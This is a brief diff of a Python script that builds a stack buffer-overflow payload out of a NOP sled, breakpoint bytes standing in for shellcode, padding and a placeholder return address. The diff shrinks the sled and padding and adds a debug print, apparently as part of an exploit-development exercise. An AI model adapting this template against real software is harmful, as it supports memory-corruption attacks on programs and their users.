@@ -7,9 +7,10 @@
 # RIP 0x7ffff7e200f5
 # NOP = 0x90
 
-nopsled = b"\x90" * 17
+nopsled = b"\x90" * 2
 buf = b"\xcc" * 55
-pad = b"A" * 72 
+pad = b"A" * 2
 rip = b"BBBBBBBB"
 
+print (1)
 print (nopsled + buf + pad + rip)
